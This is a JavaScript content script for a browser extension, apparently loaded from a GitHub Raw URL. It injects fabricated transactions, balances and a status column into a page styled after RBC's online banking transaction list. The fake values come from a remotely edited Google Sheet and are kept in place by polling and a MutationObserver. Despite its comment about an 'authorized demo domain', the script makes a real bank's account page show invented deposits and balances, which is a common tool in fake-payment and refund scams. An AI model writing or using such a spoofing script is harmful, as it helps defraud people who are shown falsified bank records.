// Remote logic.js — host this file at the GitHub Raw URL configured in background.js.
//
// This code runs only on the authorized demo domain declared by the extension.
// Google Sheet data is requested repeatedly through chrome.runtime messaging.
// Changing Sheet values does NOT reload the page.

(function startRemoteDomEngine() {
  "use strict";

  // Stop the older injected copy before replacing it with a newly fetched copy.
  if (globalThis.__REMOTE_DOM_ENGINE__?.stop) {
    globalThis.__REMOTE_DOM_ENGINE__.stop();
  }
  const DEMO_ROW_ATTRIBUTE = "data-remote-dom-row-id";
  const DEMO_COLUMN_ATTRIBUTE = "data-remote-dom-column";
  const ORIGINAL_TEXT_ATTRIBUTE = "data-remote-dom-original-text";
  const MIN_POLL_MS = 1000;
  const MAX_POLL_MS = 30000;

  const state = {
    stopped: false,
    applying: false,
    pollTimer: null,
    mutationTimer: null,
    observer: null,
    revision: "",
    config: null
  };

  function cssEscape(value) {
    if (globalThis.CSS?.escape) {
      return CSS.escape(String(value));
    }

    return String(value).replace(/["\\]/g, "\\$&");
  }

  function clampPollMs(value) {
    const parsed = Number(value);

    if (!Number.isFinite(parsed)) {
      return 1500;
    }

    return Math.min(
      MAX_POLL_MS,
      Math.max(MIN_POLL_MS, Math.round(parsed))
    );
  }

  function formatMoney(cents, config) {
    if (!Number.isSafeInteger(cents)) {
      throw new TypeError("Money values must be integer cents.");
    }

    return new Intl.NumberFormat(config.locale, {
      style: "currency",
      currency: config.currency,
      currencyDisplay: "narrowSymbol",
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(cents / 100);
  }

  function getValue(config, key) {
    if (
      !Object.prototype.hasOwnProperty.call(config.values, key)
    ) {
      throw new Error(`Unknown value key: ${key}`);
    }

    return config.values[key];
  }

  function rememberOriginalText(element) {
    if (!element.hasAttribute(ORIGINAL_TEXT_ATTRIBUTE)) {
      element.setAttribute(
        ORIGINAL_TEXT_ATTRIBUTE,
        element.textContent ?? ""
      );
    }
  }

  function restoreOriginalText() {
    document
      .querySelectorAll(`[${ORIGINAL_TEXT_ATTRIBUTE}]`)
      .forEach((element) => {
        element.textContent =
          element.getAttribute(ORIGINAL_TEXT_ATTRIBUTE) ?? "";
        element.removeAttribute(ORIGINAL_TEXT_ATTRIBUTE);
      });
  }

  function setText(selector, value) {
    document.querySelectorAll(selector).forEach((element) => {
      rememberOriginalText(element);
      const next = String(value);

      if (element.textContent !== next) {
        element.textContent = next;
      }
    });
  }

  function renderTemplate(template, config) {
    return String(template).replace(
      /\{\{(?:(money):)?([a-zA-Z0-9_]+)\}\}/g,
      (whole, formatter, key) => {
        const value = getValue(config, key);

        if (formatter === "money") {
          return formatMoney(Number(value), config);
        }

        return String(value);
      }
    );
  }

  function createCell(text, className = "") {
    const cell = document.createElement("td");
    cell.className = className;
    cell.textContent = String(text ?? "");
    return cell;
  }

  function createMoneyCell(cents, className, config) {
    const cell = document.createElement("td");
    const span = document.createElement("span");

    cell.className = `${className} ng-star-inserted`;
    span.className = "ng-star-inserted";
    span.textContent =
      cents === null || cents === undefined
        ? ""
        : formatMoney(cents, config);

    cell.appendChild(span);
    return cell;
  }

  function createBlankCell() {
    return createCell(
      "",
      "rbc-transaction-list-blank ng-star-inserted"
    );
  }

  function createDescriptionCell(lines) {
    const cell = document.createElement("td");

    cell.className =
      "rbc-transaction-list-desc " +
      "description-column-padding ng-star-inserted";

    for (const line of lines) {
      const div = document.createElement("div");
      div.className = "ng-star-inserted";
      div.textContent = String(line);
      cell.appendChild(div);
    }

    return cell;
  }

  function ensureColumn(operation, config) {
    const table = document.querySelector(operation.tableSelector);

    if (!table) {
      return;
    }

    const enabled =
      operation.enabled !== false &&
      (
        !operation.enabledValueKey ||
        Boolean(getValue(config, operation.enabledValueKey))
      );

    if (!enabled) {
      table
        .querySelectorAll(
          `[${DEMO_COLUMN_ATTRIBUTE}="${cssEscape(operation.columnKey)}"]`
        )
        .forEach((element) => element.remove());
      return;
    }

    const headerRow = table.tHead?.rows?.[0];

    if (!headerRow) {
      return;
    }

    let header = headerRow.querySelector(
      `th[${DEMO_COLUMN_ATTRIBUTE}="${cssEscape(operation.columnKey)}"]`
    );

    if (!header) {
      header = document.createElement("th");
      header.setAttribute(DEMO_COLUMN_ATTRIBUTE, operation.columnKey);
      header.setAttribute("role", "columnheader");
      header.className = "amount-format";
      headerRow.appendChild(header);
    }

    header.textContent =
      operation.headerValueKey
        ? String(getValue(config, operation.headerValueKey))
        : String(operation.header ?? "Status");

    const defaultText =
      operation.defaultValueKey
        ? String(getValue(config, operation.defaultValueKey))
        : String(operation.defaultValue ?? "");

    const bodyRows = table.tBodies?.[0]?.rows ?? [];

    for (const row of bodyRows) {
      let cell = row.querySelector(
        `td[${DEMO_COLUMN_ATTRIBUTE}="${cssEscape(operation.columnKey)}"]`
      );

      if (!cell) {
        cell = document.createElement("td");
        cell.setAttribute(DEMO_COLUMN_ATTRIBUTE, operation.columnKey);
        cell.className = "amount-format";

        const likelyControlCell =
          row.cells.length >= 6 ? row.lastElementChild : null;

        row.insertBefore(cell, likelyControlCell);
      }

      if (!row.hasAttribute(DEMO_ROW_ATTRIBUTE)) {
        cell.textContent = defaultText;
      }
    }
  }

  function upsertTransactionRow(
    tbody,
    transaction,
    position,
    config,
    statusColumnKey
  ) {
    let row = tbody.querySelector(
      `tr[${DEMO_ROW_ATTRIBUTE}="${cssEscape(transaction.id)}"]`
    );

    if (!row) {
      row = document.createElement("tr");
      row.setAttribute(DEMO_ROW_ATTRIBUTE, transaction.id);
      row.className =
        "rbc-transaction-list-transaction-new " +
        "ng-star-inserted remote-dom-row";

      if (position === "end") {
        tbody.appendChild(row);
      } else {
        tbody.insertBefore(row, tbody.firstElementChild);
      }
    }

    const signature = JSON.stringify(transaction);

    if (row.dataset.remoteDomSignature === signature) {
      return;
    }

    row.dataset.remoteDomSignature = signature;
    row.replaceChildren();

    row.appendChild(
      createCell(
        transaction.date,
        "date-column-padding ng-star-inserted"
      )
    );

    row.appendChild(
      createDescriptionCell(transaction.description)
    );

    if (transaction.amountCents < 0) {
      row.appendChild(
        createMoneyCell(
          transaction.amountCents,
          "rbc-transaction-list-withdraw",
          config
        )
      );
      row.appendChild(createBlankCell());
    } else {
      row.appendChild(createBlankCell());
      row.appendChild(
        createMoneyCell(
          transaction.amountCents,
          "rbc-transaction-list-deposit",
          config
        )
      );
    }

    row.appendChild(
      createMoneyCell(
        transaction.balanceCents,
        "rbc-transaction-list-balance",
        config
      )
    );

    if (statusColumnKey) {
      const statusCell = createCell(
        transaction.status,
        "amount-format"
      );

      statusCell.setAttribute(
        DEMO_COLUMN_ATTRIBUTE,
        statusColumnKey
      );

      row.appendChild(statusCell);
    }

    // Placeholder matching the source table's final control/chevron cell.
    row.appendChild(document.createElement("td"));
  }

  function upsertTransactions(operation, config) {
    const table = document.querySelector(operation.tableSelector);
    const tbody = table?.tBodies?.[0];

    if (!tbody) {
      return;
    }

    const remoteIds = new Set(
      config.transactions.map((transaction) => transaction.id)
    );

    tbody
      .querySelectorAll(`tr[${DEMO_ROW_ATTRIBUTE}]`)
      .forEach((row) => {
        if (!remoteIds.has(row.getAttribute(DEMO_ROW_ATTRIBUTE))) {
          row.remove();
        }
      });

    const rows =
      operation.position === "end"
        ? config.transactions
        : [...config.transactions].reverse();

    for (const transaction of rows) {
      upsertTransactionRow(
        tbody,
        transaction,
        operation.position,
        config,
        operation.statusColumnKey || ""
      );
    }
  }

  function removeDemoRowsAndColumns() {
    document
      .querySelectorAll(`[${DEMO_ROW_ATTRIBUTE}]`)
      .forEach((element) => element.remove());

    document
      .querySelectorAll(`[${DEMO_COLUMN_ATTRIBUTE}]`)
      .forEach((element) => element.remove());
  }

  function executeOperation(operation, config) {
    if (operation.enabled === false) {
      return;
    }

    switch (operation.type) {
      case "setText":
        setText(
          operation.selector,
          operation.valueKey
            ? getValue(config, operation.valueKey)
            : operation.value
        );
        break;

      case "setMoney":
        setText(
          operation.selector,
          formatMoney(
            Number(getValue(config, operation.valueKey)),
            config
          )
        );
        break;

      case "setTemplate":
        setText(
          operation.selector,
          renderTemplate(operation.template, config)
        );
        break;

      case "ensureColumn":
        ensureColumn(operation, config);
        break;

      case "upsertTransactions":
        upsertTransactions(operation, config);
        break;

      default:
        throw new Error(`Unsupported operation: ${operation.type}`);
    }
  }

  function applyConfig() {
    if (
      state.stopped ||
      state.applying ||
      !state.config
    ) {
      return;
    }

    state.applying = true;

    try {
      if (!state.config.enabled) {
        restoreOriginalText();
        removeDemoRowsAndColumns();
        return;
      }


      for (const operation of state.config.operations) {
        try {
          executeOperation(operation, state.config);
        } catch (error) {
          console.warn(
            `[remote-dom] Operation "${operation.id}" failed:`,
            error
          );
        }
      }
    } finally {
      queueMicrotask(() => {
        state.applying = false;
      });
    }
  }

  function scheduleMutationApply() {
    if (state.stopped || state.applying) {
      return;
    }

    clearTimeout(state.mutationTimer);

    state.mutationTimer = setTimeout(() => {
      applyConfig();
    }, 60);
  }

  async function pullConfig() {
    if (state.stopped) {
      return;
    }

    try {
      const response = await chrome.runtime.sendMessage({
        type: "GET_REMOTE_DOM_CONFIG",
        knownRevision: state.revision
      });

      if (!response?.ok) {
        throw new Error(
          response?.error || "Configuration request failed."
        );
      }

      if (!response.unchanged && response.config) {
        state.config = response.config;
        state.revision = response.config.revision;
        applyConfig();
      }
    } catch (error) {
      console.warn("[remote-dom] Data synchronization failed:", error);
    } finally {
      if (!state.stopped) {
        const nextDelay = clampPollMs(
          state.config?.pollMs ?? 1500
        );

        state.pollTimer = setTimeout(pullConfig, nextDelay);
      }
    }
  }

  function pullImmediately() {
    clearTimeout(state.pollTimer);
    void pullConfig();
  }

  function stop() {
    state.stopped = true;
    clearTimeout(state.pollTimer);
    clearTimeout(state.mutationTimer);
    state.observer?.disconnect();
    window.removeEventListener("focus", pullImmediately);
    document.removeEventListener(
      "visibilitychange",
      onVisibilityChange
    );
  }

  function onVisibilityChange() {
    if (document.visibilityState === "visible") {
      pullImmediately();
    }
  }

  state.observer = new MutationObserver(scheduleMutationApply);

  state.observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });

  window.addEventListener("focus", pullImmediately);
  document.addEventListener(
    "visibilitychange",
    onVisibilityChange
  );

  globalThis.__REMOTE_DOM_ENGINE__ = {
    stop,
    refresh: pullImmediately
  };

  void pullConfig();
})();
